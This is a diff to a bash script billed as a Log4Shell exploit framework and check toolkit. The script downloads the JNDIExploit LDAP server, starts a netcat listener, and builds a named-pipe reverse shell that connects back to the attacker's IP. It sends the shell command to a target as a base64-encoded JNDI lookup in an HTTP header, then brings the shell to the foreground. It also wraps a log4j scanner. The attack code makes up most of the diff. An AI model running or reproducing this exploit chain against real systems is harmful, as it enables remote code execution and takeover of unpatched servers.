@@ -23,7 +23,7 @@
 # > Running Log4shell Framework & Check-Toolkit on shell v0.1a (C) 2021 suuhm
 
 
-MY_IP=$(ip addr show dev eth0 | grep inet | sed -r 's/.*\ ([0-9].*\.*\/..).*/\1/g')
+MY_IP=$(ip addr | grep "inet .*scope global" | sed -r 's/.*\ ([0-9].*)\/.*/\1/g')
 XPL_IP=$MY_IP
 
 _url_encoder() {
@@ -36,6 +36,20 @@ _url_encoder() {
 						-e 's/@/%40/g' -e 's/\[/%5b/g' -e 's/\\/%5c/g' -e 's/\]/%5d/g' -e 's/\^/%5e/g' \
 						-e 's/_/%5f/g' -e 's/`/%60/g' -e 's/{/%7b/g' -e 's/|/%7c/g' -e 's/}/%7d/g' -e 's/~/%7e/g'
 	return 0
+}
+
+_run_xploit_server() {
+
+	if [ ! -f JNDIExploit.v1.2.zip ]; then
+		echo -e "\nDownloading Exploit Server...\n"
+		# Here you need the JNDIExploit or some other LDAP server: archive.org for
+		ARCH_URL="https://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream"
+		curl -#SL "$ARCH_URL" -o JNDIExploit.v1.2.zip && unzip JNDIExploit.v1.2.zip
+	fi
+	
+	sleep 2
+	echo -e "\nRunning LDAP server on $XPL_IP:8888 -> LDAP:1389\n"
+	java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888
 }
 
 _set_windows() {
@@ -109,18 +123,14 @@ _run_dummy_server() {
 	# docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 
 	# ssh $XPL_IP -p 22 "wget $ARCH_URL && unzip JNDIExploit.v1.2.zip && java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888"
-  #Here you need the JNDIExploit or some other LDAP server: archive.org can help here.
-	ARCH_URL="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip"
-
-	wget $ARCH_URL && unzip JNDIExploit.v1.2.zip
-	sleep 2
-	echo "Running LDAP server on $XPL_IP:8888"
-	java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888
-
+	_run_xploit_server
 }
 
 _run_attack() {
 
+	_run_xploit_server
+	sleep 2
+	
 	if [[ "$2" =~ ^-[a-z] ]]; then
 		VIC_IP_PRT=127.0.0.1:8080
 		C3=$2
@@ -137,11 +147,9 @@ _run_attack() {
 		#Listen & run on other term/host
 		nohup nc -nvlp 4244 &
 
-		# rm -f /tmp/backpipe;mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc $MY_IP 4242 1>/tmp/backpipe
-		# Alternate
-		# rm -f /tmp/bp;mknod /tmp/bp p && cat /tmp/bp | /bin/sh -i 2>&1 | nc $MY_IP 4242 >/tmp/bp
-
-		C="mknod rm -f /tmp/backpipe;/tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc $MY_IP 4242 1>/tmp/backpipe"
+		# Reverse Prixy Shell - NC version
+		# rm -f /tmp/bp;mknod /tmp/bp p && cat /tmp/bp | /bin/sh -i 2>&1 | nc $MY_IP 4244 >/tmp/bp
+		C="rm -f /tmp/bp;mknod /tmp/bp p && /bin/sh 0</tmp/bp | nc $MY_IP 4244 1>/tmp/bp"
 	elif [[ "$C3" =~ ^-t ]]; then
 		C="touch /root/helloroot"
 	else
@@ -155,26 +163,31 @@ _run_attack() {
 
 	echo -e "\nConnection to $VIC_IP_PRT"
 	curl $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://$XPL_IP:1389/Basic/Command/Base64/$B64S}'
+	
+	if [ -z $RSH ]; then
+		echo "Foreground Reverse Shell..."
+		sleep 3 && fg 1
+	fi
 }
 
 _get_python_scan() {
 	# https://github.com/fullhunt/log4j-scan
 	# see more for WAF bypass and listscans etc.
 
-	if [ -z $2 ]; then
-		_COM="-u https://127.0.0.1 --run-all-tests"
+	if [ ! -z $2 ]; then
+		_COM="-u http://127.0.0.1:80 --run-all-tests"
 	else
 		_COM=$2
-
 	fi
-
-	git clone https://github.com/fullhunt/log4j-scan
-	cd log4j-scan && pip3 install -r requirements.txt
-
-	echo "Installation finished"
-	echo "RUN:"
+	
+	if [ ! -d log4j-scan ]; then
+		git clone https://github.com/fullhunt/log4j-scan
+		cd log4j-scan && pip3 install -r requirements.txt
+		echo "Installation finished"
+	fi
+	
+	echo -e "\nRUNNING:\n"
 	sleep 2
-	echo
 	python3 log4j-scan.py $_COM
 }
 
@@ -214,7 +227,7 @@ elif [ "$1" == "--run-attack" ]; then
 	fi
 	exit 0
 elif [ "$1" == "--python-scan" ]; then
-	_get_python_scan
+	_get_python_scan $2
 	exit 0
 else
 	echo "Wrong input! Please enter one of these options:"
